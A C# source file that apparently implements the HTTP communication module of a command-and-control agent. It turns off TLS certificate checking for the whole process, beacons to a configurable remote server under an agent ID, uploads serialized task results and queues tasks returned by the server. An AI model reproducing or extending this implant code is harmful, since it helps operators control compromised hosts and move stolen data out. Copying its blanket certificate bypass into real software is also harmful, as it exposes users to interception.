using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }

        public string Protocol { get; set; }

        private CancellationTokenSource _tokenSource;

        private HttpClient _client;
        public HttpCommModule(MessageManager messManager) : base(messManager)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = new
            RemoteCertificateValidationCallback
            (
               delegate
               {
                   return true;
               }
            );
        }


        public void Init(string protocol, string connectAddress, int connectPort)
        {
            ConnectAddress=connectAddress;
            ConnectPort=connectPort;
            Protocol = protocol;

            _client = new HttpClient();
            _client.Timeout = new TimeSpan(0, 0, 10);
            //_client.BaseAddress = new Uri($"https://{this.ConnectAddress}:{this.ConnectPort
            _client.BaseAddress = new Uri($"{this.Protocol}://{this.ConnectAddress}:{this.ConnectPort}");
            //Console.WriteLine(_client.BaseAddress);
            _client.DefaultRequestHeaders.Clear();

            this.IsInitialized = true;
        }

        public override async void Stop()
        {
            if (!this.IsRunning)
                return;

            this._tokenSource.Cancel();
        }

        public override async void Start()
        {
            this.IsRunning = false;
            if (!this.IsInitialized)
                return;

            _tokenSource = new CancellationTokenSource();

            this.IsRunning = true;
            while (!_tokenSource.IsCancellationRequested)
            {
                try
                {
                    var results = this.MessageManager.GetMessageResultsToRelay();
                    if (results.Any())
                        await PostData(results);
                    else
                        await this.CheckIn();
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine(ex.ToString());
#endif
                }

                await Task.Delay(this.GetDelay());
            }

            this.IsRunning = false;
        }

        private async Task CheckIn()
        {
            var response = await _client.GetByteArrayAsync($"/{this.MessageManager.AgentMetaData.Id}");
            HandleResponse(response);
        }

        private async Task PostData(List<MessageResult> results)
        {
            //var ser = Encoding.UTF8.GetString(results.Serialize());
            foreach (var resMess in results)
            {
                resMess.Header.Path.Insert(0,this.MessageManager.AgentMetaData.Id);
            }

            var content = new StringContent(Encoding.UTF8.GetString(results.Serialize()), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync($"/{this.MessageManager.AgentMetaData.Id}", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();
            this.HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            //string bitString = Encoding.UTF8.GetString(response, 0, response.Length);
            var messages = response.Deserialize<List<MessageTask>>();
            this.MessageManager.EnqueueTasks(messages);
        }
    }
}
